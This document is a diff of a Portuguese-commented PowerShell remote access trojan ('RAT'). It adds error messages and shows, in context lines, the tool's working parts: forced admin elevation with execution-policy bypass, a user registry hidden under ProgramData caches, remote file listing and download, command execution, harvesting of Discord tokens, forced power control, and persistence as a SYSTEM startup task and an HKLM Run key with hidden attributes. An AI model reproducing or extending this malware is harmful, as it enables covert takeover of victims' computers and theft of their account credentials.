@@ -19,9 +19,8 @@ $userListFile = "$env:ProgramData\Microsoft\Windows\Caches\users.dat"
 $mutex = New-Object System.Threading.Mutex($false, $mutexName)
 if (-not $mutex.WaitOne(0, $false)) { exit }
 
-# ===== VERIFICAR SE É ADMIN (NOVA FUNÇÃO) =====
+# ===== VERIFICAR SE É ADMIN =====
 if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
-    # Mensagem de erro em vermelho
     $host.UI.RawUI.ForegroundColor = "Red"
     Write-Host ""
     Write-Host "╔════════════════════════════════════════════════════════════╗"
@@ -37,13 +36,11 @@ if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdent
     Write-Host "╚════════════════════════════════════════════════════════════╝"
     Write-Host ""
     $host.UI.RawUI.ForegroundColor = "White"
-    
-    # Aguarda 5 segundos para o usuário ler
     Start-Sleep -Seconds 5
     exit
 }
 
-# ===== FUNÇÃO PARA DELETAR USUÁRIO DO RAT (NOVA FUNÇÃO) =====
+# ===== FUNÇÃO PARA DELETAR USUÁRIO DO RAT =====
 function Remove-UserFromRAT {
     param([string]$UserName)
     
@@ -57,7 +54,9 @@ function Remove-UserFromRAT {
                 Write-Host "[✓] Registro removido" -ForegroundColor Green
                 $removido = $true
             }
-        } catch { }
+        } catch {
+            Write-Host "[!] Erro ao remover registro" -ForegroundColor Red
+        }
         
         # 2. Remove da lista de usuários
         try {
@@ -68,9 +67,11 @@ function Remove-UserFromRAT {
                 Write-Host "[✓] Usuário removido da lista" -ForegroundColor Green
                 $removido = $true
             }
-        } catch { }
+        } catch {
+            Write-Host "[!] Erro ao remover da lista" -ForegroundColor Red
+        }
         
-        # 3. Remove tarefas agendadas associadas ao usuário
+        # 3. Remove tarefas agendadas
         try {
             $tasks = Get-ScheduledTask -TaskPath "\" -ErrorAction SilentlyContinue | Where-Object { $_.TaskName -like "*$installName*" }
             foreach ($task in $tasks) {
@@ -78,7 +79,9 @@ function Remove-UserFromRAT {
                 Write-Host "[✓] Tarefa agendada removida: $($task.TaskName)" -ForegroundColor Green
                 $removido = $true
             }
-        } catch { }
+        } catch {
+            Write-Host "[!] Erro ao remover tarefas" -ForegroundColor Red
+        }
         
         if ($removido) {
             return "USUARIO_REMOVIDO"
@@ -86,6 +89,7 @@ function Remove-UserFromRAT {
             return "USUARIO_NAO_ENCONTRADO"
         }
     } catch {
+        Write-Host "[!] Erro geral: $_" -ForegroundColor Red
         return "ERRO_AO_REMOVER"
     }
 }
@@ -95,7 +99,6 @@ function Get-RATUsers {
     try {
         $users = @()
         
-        # Lê da lista de usuários
         if (Test-Path $userListFile) {
             $users = Get-Content $userListFile -ErrorAction SilentlyContinue
         }
@@ -106,6 +109,7 @@ function Get-RATUsers {
         
         return "USUARIOS:" + ($users -join "`n")
     } catch {
+        Write-Host "[!] Erro ao listar usuários: $_" -ForegroundColor Red
         return "ERRO_AO_LISTAR"
     }
 }
@@ -115,19 +119,16 @@ function Add-UserToList {
     param([string]$UserName)
     
     try {
-        # Garante que a pasta existe
         New-Item -ItemType Directory -Path "$env:ProgramData\Microsoft\Windows\Caches" -Force | Out-Null
-        
-        # Adiciona usuário à lista
         Add-Content -Path $userListFile -Value $UserName -Force
         
-        # Também adiciona ao registro
         New-Item -Path $registryPath -Force | Out-Null
         Set-ItemProperty -Path $registryPath -Name "UserName" -Value $UserName -Force
         Set-ItemProperty -Path $registryPath -Name "InstallDate" -Value (Get-Date).ToString() -Force
         
         return $true
     } catch {
+        Write-Host "[!] Erro ao adicionar usuário: $_" -ForegroundColor Red
         return $false
     }
 }
@@ -136,21 +137,24 @@ function Add-UserToList {
 $currentUser = "$env:COMPUTERNAME@$env:USERNAME"
 $userExecuted = $false
 
-if (Test-Path $userListFile) {
-    $users = Get-Content $userListFile -ErrorAction SilentlyContinue
-    if ($users -contains $currentUser) {
-        $userExecuted = $true
-        Write-Host "[i] Usuário $currentUser já executou o RAT anteriormente" -ForegroundColor Yellow
+try {
+    if (Test-Path $userListFile) {
+        $users = Get-Content $userListFile -ErrorAction SilentlyContinue
+        if ($users -contains $currentUser) {
+            $userExecuted = $true
+            Write-Host "[i] Usuário $currentUser já executou o RAT anteriormente" -ForegroundColor Yellow
+        }
     }
+} catch {
+    Write-Host "[!] Erro ao verificar usuário: $_" -ForegroundColor Red
 }
 
-# Se não executou antes, adiciona à lista
 if (-not $userExecuted) {
     Add-UserToList $currentUser
     Write-Host "[+] Novo usuário adicionado: $currentUser" -ForegroundColor Green
 }
 
-# ===== ELEVAR PRIVILEGIOS (JÁ VERIFICADO, MAS MANTÉM COMO FALLBACK) =====
+# ===== ELEVAR PRIVILEGIOS =====
 if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
     $arguments = "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`""
     Start-Process powershell -Verb RunAs -ArgumentList $arguments
@@ -285,7 +289,9 @@ function Get-FileList {
             }
         }
         return ($items | ConvertTo-Json -Compress)
-    } catch { return "[]" }
+    } catch { 
+        return "[]" 
+    }
 }
 
 function Download-File {
@@ -296,7 +302,9 @@ function Download-File {
             return "FILE:$content"
         }
         return "FILE_NOT_FOUND"
-    } catch { return "DOWNLOAD_ERROR" }
+    } catch { 
+        return "DOWNLOAD_ERROR" 
+    }
 }
 
 # ===== EXECUTAR COMANDO =====
@@ -342,7 +350,9 @@ function Get-DiscordToken {
                         foreach ($match in $matches) {
                             $tokens += $match.Value
                         }
-                    } catch { }
+                    } catch {
+                        Write-Host "[!] Erro ao ler arquivo de token" -ForegroundColor Red
+                    }
                 }
             }
         }
@@ -638,7 +648,9 @@ function Power-Control {
             "reboot" { Restart-Computer -Force }
         }
         return "POWER_$Action"
-    } catch { return "POWER_ERROR" }
+    } catch { 
+        return "POWER_ERROR" 
+    }
 }
 
 # ===== PERSISTENCIA =====
@@ -653,12 +665,16 @@ function Install-Persistence {
         $trigger = New-ScheduledTaskTrigger -AtStartup
         $principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
         Register-ScheduledTask -TaskName $installName -Action $action -Trigger $trigger -Principal $principal -Force
-    } catch { }
+    } catch {
+        Write-Host "[!] Erro ao criar tarefa agendada" -ForegroundColor Red
+    }
     
     try {
         $regPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
         Set-ItemProperty -Path $regPath -Name $installName -Value "powershell.exe -NoProfile -WindowStyle Hidden -File `"$scriptPath`"" -Force
-    } catch { }
+    } catch {
+        Write-Host "[!] Erro ao criar registro" -ForegroundColor Red
+    }
     
     attrib +h +s +r $scriptPath
 }
